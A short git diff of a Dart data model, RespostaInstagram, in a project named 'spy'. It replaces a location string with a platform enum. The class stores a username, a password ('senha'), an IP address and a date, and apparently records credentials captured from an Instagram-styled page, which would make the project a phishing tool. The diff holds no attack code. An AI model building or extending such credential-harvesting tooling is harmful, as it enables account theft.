@@ -1,3 +1,4 @@
+import 'package:spy/src/shared/enums/platforms.dart';
 import 'package:spy/src/shared/model/base_resposta_model.dart';
 
 class RespostaInstagram extends BaseRespostaModel {
@@ -9,7 +10,7 @@ class RespostaInstagram extends BaseRespostaModel {
     String? url,
     required this.user,
     required this.senha,
-    required String local,
+    required Platform platform,
     required DateTime date,
-  }) : super(ip: ip, local: local, url: url, date: date);
+  }) : super(ip: ip, platform: platform, url: url, date: date);
 }
